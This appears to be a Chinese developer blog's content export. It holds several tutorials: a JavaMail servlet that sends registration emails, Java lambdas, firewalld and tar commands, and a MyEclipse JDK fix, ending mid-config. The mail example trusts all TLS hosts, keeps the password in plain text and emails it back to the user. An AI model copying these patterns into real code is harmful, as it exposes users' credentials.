<h2 id="实战：注册通知邮件"><a href="#实战：注册通知邮件" class="headerlink" title="实战：注册通知邮件"></a>实战：注册通知邮件</h2><h3 id="index-JSP"><a href="#index-JSP" class="headerlink" title="index.JSP"></a>index.JSP</h3><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h2&gt;Hello World!&lt;/h2&gt;</span><br><span class="line">        &lt;form action=<span class="string">&quot;$&#123;pageContext.request.contextPath&#125;/RegisterServlet.do&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">            用户名：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;</span><br><span class="line">            密码：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;pwd&quot;</span>&gt;</span><br><span class="line">            邮箱：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;email&quot;</span>&gt;</span><br><span class="line">            &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;注册&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="实体类"><a href="#实体类" class="headerlink" title="实体类"></a>实体类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String username, String password, String email)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">        <span class="keyword">this</span>.email = email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getEmail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setEmail</span><span class="params">(String email)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.email = email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;username=&#x27;&quot;</span> + username + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, password=&#x27;&quot;</span> + password + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, email=&#x27;&quot;</span> + email + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="绑定路径"><a href="#绑定路径" class="headerlink" title="绑定路径"></a>绑定路径</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>RegisterServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.csn.MailDemo01.servlet.RegisterServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>RegisterServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/RegisterServlet.do<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cn.csn.MailDemo01.pojo.User;</span><br><span class="line"><span class="keyword">import</span> cn.csn.MailDemo01.utils.Sendmail;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RegisterServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String username=req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        String password=req.getParameter(<span class="string">&quot;pwd&quot;</span>);</span><br><span class="line">        String email=req.getParameter(<span class="string">&quot;email&quot;</span>);</span><br><span class="line"></span><br><span class="line">        User user=<span class="keyword">new</span> User(username,password,email);</span><br><span class="line">        Sendmail send=<span class="keyword">new</span> Sendmail(user);</span><br><span class="line">        send.start();</span><br><span class="line">        System.out.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="发送邮件核心类"><a href="#发送邮件核心类" class="headerlink" title="发送邮件核心类"></a>发送邮件核心类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cn.csn.MailDemo01.pojo.User;</span><br><span class="line"><span class="keyword">import</span> com.sun.mail.util.MailSSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.mail.*;</span><br><span class="line"><span class="keyword">import</span> javax.mail.internet.InternetAddress;</span><br><span class="line"><span class="keyword">import</span> javax.mail.internet.MimeMessage;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Sendmail</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String from=<span class="string">&quot;XXX@qq.com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String host=<span class="string">&quot;smtp.qq.com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> User user;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Sendmail</span><span class="params">(User user)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.user=user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Properties prop=<span class="keyword">new</span> Properties();</span><br><span class="line">            prop.setProperty(<span class="string">&quot;mail.host&quot;</span>,host);<span class="comment">///设置QQ邮件服务器</span></span><br><span class="line">            prop.setProperty(<span class="string">&quot;mail.transport.protocol&quot;</span>,<span class="string">&quot;smtp&quot;</span>);<span class="comment">///邮件发送协议</span></span><br><span class="line">            prop.setProperty(<span class="string">&quot;mail.smtp.auth&quot;</span>,<span class="string">&quot;true&quot;</span>);<span class="comment">//需要验证用户密码</span></span><br><span class="line">            <span class="comment">//QQ邮箱需要设置SSL加密</span></span><br><span class="line">            MailSSLSocketFactory sf=<span class="keyword">new</span> MailSSLSocketFactory();</span><br><span class="line">            sf.setTrustAllHosts(<span class="keyword">true</span>);</span><br><span class="line">            prop.put(<span class="string">&quot;mail.smtp.ssl.enable&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">            prop.put(<span class="string">&quot;mail.smtp.ssl.socketFactory&quot;</span>,sf);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//使用javaMail发送邮件的5个步骤</span></span><br><span class="line">            <span class="comment">//1.创建定义整个应用程序所需要的环境信息的session对象</span></span><br><span class="line">            Session session= Session.getDefaultInstance(prop, <span class="keyword">new</span> Authenticator() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> PasswordAuthentication <span class="title">getPasswordAuthentication</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> PasswordAuthentication(from,<span class="string">&quot;授权码&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="comment">//开启session的debug模式，这样可以查看到程序发送Email的运行状态</span></span><br><span class="line">            session.setDebug(<span class="keyword">true</span>);</span><br><span class="line">            <span class="comment">//2.通过session得到transport对象</span></span><br><span class="line">            Transport ts=session.getTransport();</span><br><span class="line">            <span class="comment">//3.使用邮箱的用户名和授权码连上邮件服务器</span></span><br><span class="line">            ts.connect(host,from,<span class="string">&quot;授权码&quot;</span>);</span><br><span class="line">            <span class="comment">//4.创建邮件：写文件</span></span><br><span class="line">            <span class="comment">//注意需要传递session</span></span><br><span class="line">            MimeMessage message=<span class="keyword">new</span> MimeMessage(session);</span><br><span class="line">            <span class="comment">//指明邮件的发件人</span></span><br><span class="line">            message.setFrom(<span class="keyword">new</span> InternetAddress(from));</span><br><span class="line">            <span class="comment">//指明邮件的收件人</span></span><br><span class="line">            message.setRecipient(Message.RecipientType.TO,<span class="keyword">new</span> InternetAddress(user.getEmail()));</span><br><span class="line">            <span class="comment">//邮件标题</span></span><br><span class="line">            message.setSubject(<span class="string">&quot;注册通知&quot;</span>);</span><br><span class="line">            <span class="comment">//邮件的文本内容</span></span><br><span class="line">            message.setContent(<span class="string">&quot;恭喜你(&quot;</span>+user.getUsername()+<span class="string">&quot;)成功注册！&quot;</span>+<span class="string">&quot;密码：&quot;</span>+user.getPassword()</span><br><span class="line">                               ,<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">            <span class="comment">//5.发送邮件</span></span><br><span class="line">            ts.sendMessage(message,message.getAllRecipients());</span><br><span class="line"></span><br><span class="line">            <span class="comment">//6.关闭连接</span></span><br><span class="line">            ts.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里引入多线程的目的是为了提高用户的体验，防止因发送文件时间过长，导致前端响应过久，因此这里采用异步响应。</p>
]]></content>
      <tags>
        <tag>SMTP发送</tag>
        <tag>POP接收</tag>
        <tag>servlet</tag>
        <tag>代码发送邮件</tag>
      </tags>
  </entry>
  <entry>
    <title>Lambda表达式</title>
    <url>/2021/08/31/Lamda%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="函数式接口的定义"><a href="#函数式接口的定义" class="headerlink" title="函数式接口的定义"></a>函数式接口的定义</h2><span id="more"></span>

<ul>
<li>任何接口，如果<strong>只包含唯一一个抽象方法</strong>，那么它就是一个函数式接口</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>对于函数式接口，我们可以通过lambda表达式来创建该接口的对象</li>
</ul>
<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p><strong>语法</strong>和<strong>简化技巧</strong>同<strong>ES6中的箭头函数</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 6.用Lambda简化（接口必须是函数式接口）</span></span><br><span class="line">like = () -&gt; &#123;		<span class="comment">// like是Like类的一个对象</span></span><br><span class="line">	System.out.println(<span class="string">&quot;我喜欢lambda6&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>简化技巧：</strong></p>
<ul>
<li><strong>参数类型</strong>可以不写（默认设置为接口中的参数类型；要么全去掉，要么全加上）</li>
<li>参数列表的<strong>括号</strong>可以省略（只有仅含一个参数的时候，才可以省略）</li>
<li>方法体的<strong>大括号</strong>可以省略（只有当方法体中只有一条语句的时候，才可以省略）</li>
</ul>
<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.定义一个函数式接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Like</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">lambda</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.普通类实现接口</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Like1</span> <span class="keyword">implements</span> <span class="title">Like</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lambda</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我喜欢lambda&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestLambda</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 3.非静态内部类（对外不直接可见，必须有一个外部类的引用才能被创建）</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Like2</span> <span class="keyword">implements</span> <span class="title">Like</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lambda</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;我喜欢lambda2&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.静态内部类（对外直接可见，可以直接创建对象）</span></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Like3</span> <span class="keyword">implements</span> <span class="title">Like</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lambda</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;我喜欢lambda3&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Like like = <span class="keyword">new</span> Like1();</span><br><span class="line">        like.lambda();</span><br><span class="line"></span><br><span class="line">        like = <span class="keyword">new</span> TestLambda().<span class="function">new <span class="title">Like2</span><span class="params">()</span></span>;    <span class="comment">// 创建非静态内部类</span></span><br><span class="line">        like.lambda();</span><br><span class="line"></span><br><span class="line">        like = <span class="keyword">new</span> Like3();     <span class="comment">//  创建静态内部类</span></span><br><span class="line">        like.lambda();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4.局部内部类</span></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Like4</span> <span class="keyword">implements</span> <span class="title">Like</span> </span>&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lambda</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;我喜欢lambda4&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        like = <span class="keyword">new</span> Like4();</span><br><span class="line">        like.lambda();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5.匿名内部类（没有类名，必须借助接口或者父类）</span></span><br><span class="line">        like = <span class="keyword">new</span> Like() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lambda</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;我喜欢lambda5&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        like.lambda();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6.用Lambda简化（接口必须是函数式接口）</span></span><br><span class="line">        like = () -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;我喜欢lambda6&quot;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        like.lambda();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>函数式接口</tag>
        <tag>lambda表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux防火墙相关命令</title>
    <url>/2023/01/07/Linux%E9%98%B2%E7%81%AB%E5%A2%99%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="Linux防火墙相关命令"><a href="#Linux防火墙相关命令" class="headerlink" title="Linux防火墙相关命令"></a>Linux防火墙相关命令</h2><span id="more"></span>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开启</span></span><br><span class="line">service firewalld start</span><br><span class="line"><span class="comment"># 重启</span></span><br><span class="line">service firewalld restart</span><br><span class="line"><span class="comment"># 关闭</span></span><br><span class="line">service firewalld stop</span><br><span class="line"><span class="comment"># 查看防火墙规则</span></span><br><span class="line">firewall-cmd --list-all</span><br><span class="line"><span class="comment"># 查看端口是否开放</span></span><br><span class="line">firewall-cmd --query-port=8080/tcp</span><br><span class="line"><span class="comment"># 开放80端口</span></span><br><span class="line">firewall-cmd --permanent --add-port=80/tcp</span><br><span class="line"><span class="comment"># 移除端口</span></span><br><span class="line">firewall-cmd --permanent --remove-port=8080/tcp</span><br><span class="line"><span class="comment"># 重启防火墙（修改配置后要重启防火墙）</span></span><br><span class="line">firewall-cmd --reload</span><br><span class="line"><span class="comment"># 参数解释</span></span><br><span class="line">firewall-cmd：是Linux提供的操作firewall的一个工具</span><br><span class="line">--permanent：表示设置为持久</span><br><span class="line">--add-port：标识添加的端口 </span><br></pre></td></tr></table></figure>

<blockquote>
<p>注：在开放、移除端口操作之后，并不会立即生效（因为这两个命令仅是修改了配置文件的内容，若要生效，还需要执行重启的命令，来重新读取防火墙的配置文件）</p>
</blockquote>
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>MyEclipse——jdk版本不支持</title>
    <url>/2021/05/29/MyEclipse%E2%80%94%E2%80%94jdk%E7%89%88%E6%9C%AC%E4%B8%8D%E6%94%AF%E6%8C%81/</url>
    <content><![CDATA[<h2 id="简要说明"><a href="#简要说明" class="headerlink" title="简要说明"></a>简要说明</h2><span id="more"></span>

<ul>
<li>在计算机中执行生成jar文件也会出现和本文中讨论的问题一样的错误，两种情况的原因是一样的，其解决方法可以参考我的另一篇文章：<a href="https://liu-ruyang.github.io/2021/06/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%89%A7%E8%A1%8C%E6%89%80%E7%94%9F%E6%88%90%E7%9A%84jar%E6%96%87%E4%BB%B6%E6%8A%A5%E9%94%99%E2%80%94%E2%80%94%E7%89%88%E6%9C%AC%E4%B8%8D%E6%94%AF%E6%8C%81/">计算机执行所生成的jar文件报错：版本不支持</a></li>
</ul>
<h2 id="报错信息——java-lang-UnsupportedClassVersionError"><a href="#报错信息——java-lang-UnsupportedClassVersionError" class="headerlink" title="报错信息——java.lang.UnsupportedClassVersionError"></a>报错信息——java.lang.UnsupportedClassVersionError</h2><h3 id="在编译运行的时候报如下的错误"><a href="#在编译运行的时候报如下的错误" class="headerlink" title="在编译运行的时候报如下的错误"></a>在编译运行的时候报如下的错误</h3><pre><code>错误: 加载主类 Test 时出现 LinkageError
java.lang.UnsupportedClassVersionError: Test has been compiled by a more recent version of the Java Runtime (class file version 58.0), this
version of the Java Runtime only recognizes class file versions up to 55.0
</code></pre>
<p><img src="https://i.loli.net/2021/05/29/IlKuxRMXBepzTQq.png" alt="屏幕截图 2021-05-29 145337.png"></p>
<p>放大看错误</p>
<p><img src="https://i.loli.net/2021/05/29/Y1OJycCIPq8aHAK.png" alt="屏幕截图 2021-05-29 145604.png"></p>
<h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><p><strong>这是因为MyEclipse所设置支持的编译器的版本和自己本项目所使用的jdk版本不同，需要手动改一下（二者随便改哪一个都行，目标都是改成一致的）</strong></p>
<h3 id="解决办法①：查看、修改jdk版本"><a href="#解决办法①：查看、修改jdk版本" class="headerlink" title="解决办法①：查看、修改jdk版本"></a>解决办法①：查看、修改jdk版本</h3><p>例如：本人所使用的jdk版本是<strong>jdk11</strong></p>
<p>修改jdk版本方法如下：</p>
<p>①依次点击：<strong>Window - preference - java - installed JREs - add</strong>，出现下面界面（初始时列表里只有一个jdk版本的（即只有第一行那个））</p>
<p><img src="https://i.loli.net/2021/05/29/BRp4XsO6WTI51mJ.png" alt="屏幕截图 2021-05-29 150338.png"></p>
<p>②选择<strong>Standard VM</strong>，点击 <strong>Directory（选择自己的jdk）- 输入JRE name（随意）- Finish</strong></p>
<p><img src="https://i.loli.net/2021/05/29/wHCYGEOyL8kvanZ.png" alt="屏幕截图 2021-05-29 150415.png"></p>
<p><img src="https://i.loli.net/2021/05/29/FrywNIpWDX3mPeM.png" alt="屏幕截图 2021-05-29 150622.png"></p>
<p>③勾选自己添加的jdk，然后点击Apply，然后结束。</p>
<p><img src="https://i.loli.net/2021/05/29/XSBMowaq8DrLfEd.png" alt="屏幕截图 2021-05-29 150722.png"></p>
<h3 id="解决方法②：查看、修改eclipse选择支持使用的编译器版本"><a href="#解决方法②：查看、修改eclipse选择支持使用的编译器版本" class="headerlink" title="解决方法②：查看、修改eclipse选择支持使用的编译器版本"></a>解决方法②：查看、修改eclipse选择支持使用的编译器版本</h3><p>①依次点击：<strong>Window - preference - java - Compiler</strong></p>
<p><img src="https://i.loli.net/2021/05/29/LI6VqRWouS5QKkT.png" alt="屏幕截图 2021-05-29 152127.png"></p>
<p>②将编译器版本改为自己想要使用的版本（与上面设置的那个版本相同就行了），点击Apply应用结束</p>
<h3 id="修改效果"><a href="#修改效果" class="headerlink" title="修改效果"></a>修改效果</h3><p>编译运行成功</p>
<p><img src="https://i.loli.net/2021/05/29/ETzhQY87PFvcbfO.png" alt="屏幕截图 2021-05-29 152341.png"></p>
]]></content>
  </entry>
  <entry>
    <title>Linux解、压缩命令</title>
    <url>/2022/12/31/Linux%E8%A7%A3%E3%80%81%E5%8E%8B%E7%BC%A9%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="内置tar命令"><a href="#内置tar命令" class="headerlink" title="内置tar命令"></a>内置tar命令</h2><span id="more"></span>

<p>linux压缩命令一般可用tar命令，因为tar属于linux系统内置的命令，所以无需额外安装直接可用。</p>
<h3 id="tar命令参数说明"><a href="#tar命令参数说明" class="headerlink" title="tar命令参数说明"></a>tar命令参数说明</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-c: 建立压缩档案</span><br><span class="line">-x：解压</span><br><span class="line">-t：查看内容</span><br><span class="line">-r：向压缩归档文件末尾追加文件</span><br><span class="line">-u：更新原压缩包中的文件</span><br><span class="line"></span><br><span class="line">以上5个是独立的命令，压缩解压都要用到其中1个，可以和别的命令连用但只能用其中1个。</span><br></pre></td></tr></table></figure>

<h3 id="下面的参数是根据需要在压缩或解压档案时可选的"><a href="#下面的参数是根据需要在压缩或解压档案时可选的" class="headerlink" title="下面的参数是根据需要在压缩或解压档案时可选的"></a>下面的参数是根据需要在压缩或解压档案时可选的</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-z：有gzip属性的</span><br><span class="line">-j：有bz2属性的</span><br><span class="line">-Z：有compress属性的</span><br><span class="line">-v：显示所有过程</span><br><span class="line">-O：将文件解开到标准输出 </span><br></pre></td></tr></table></figure>

<h3 id="下面的参数-f是必须的："><a href="#下面的参数-f是必须的：" class="headerlink" title="下面的参数-f是必须的："></a>下面的参数-f是必须的：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-f: 使用档案名字，这个参数要放在最后，后面只能接档案名（文件名）。</span><br></pre></td></tr></table></figure>
<p>另外，linux的压缩命令可用的还有zip、rar、7z等等，但一般要先进行安装对应的软件。</p>
<h2 id="常用示例"><a href="#常用示例" class="headerlink" title="常用示例"></a>常用示例</h2><h3 id="tar-打包压缩文件命令："><a href="#tar-打包压缩文件命令：" class="headerlink" title="tar 打包压缩文件命令："></a>tar 打包压缩文件命令：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar zcvf test.zip.tar  test.png</span><br></pre></td></tr></table></figure>

<h3 id="tar-打包压缩文件夹命令："><a href="#tar-打包压缩文件夹命令：" class="headerlink" title="tar 打包压缩文件夹命令："></a>tar 打包压缩文件夹命令：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar zcvf test.zip.tar  test&#x2F;</span><br></pre></td></tr></table></figure>

<h3 id="tar-压缩文件解压："><a href="#tar-压缩文件解压：" class="headerlink" title="tar 压缩文件解压："></a>tar 压缩文件解压：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar zxvf test.zip.tar</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Mybatis-Spring的事务配置模板</title>
    <url>/2021/11/06/Mybatis-Spring%E7%9A%84%E4%BA%8B%E5%8A%A1%E9%85%8D%E7%BD%AE%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<h2 id="Mybatis-Spring的事务配置模板"><a href="#Mybatis-Spring的事务配置模板" class="headerlink" title="Mybatis-Spring的事务配置模板"></a>Mybatis-Spring的事务配置模板</h2><span id="more"></span>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--1、配置声明式事务--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;transactionManager&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--结合AOP实现事务的织入--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--配置事务的类--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tx:advice</span> <span class="attr">id</span>=<span class="string">&quot;txAdvice&quot;</span> <span 